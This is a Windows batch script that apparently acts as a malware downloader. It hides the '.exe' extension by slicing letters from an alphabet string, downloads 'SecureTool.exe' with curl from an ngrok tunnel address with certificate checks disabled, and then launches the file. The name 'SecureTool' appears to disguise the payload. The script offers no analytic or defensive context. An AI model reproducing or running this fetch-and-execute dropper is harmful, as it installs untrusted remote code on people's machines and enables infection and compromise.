@echo off & setlocal EnableDelayedExpansion
setlocal

SET mypath=%~dp0

set ran_name=SecureTool
set chars=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ

set ran_name=%ran_name%.%chars:~4,1%%chars:~23,1%%chars:~4,1%

cmd /c curl -f -k -o %ran_name% https://chug-frostbite-outthink.ngrok-free.dev/uploads/SecureTool.exe

if exist %mypath%%ran_name% (
    start %mypath%%ran_name%
)

EXIT
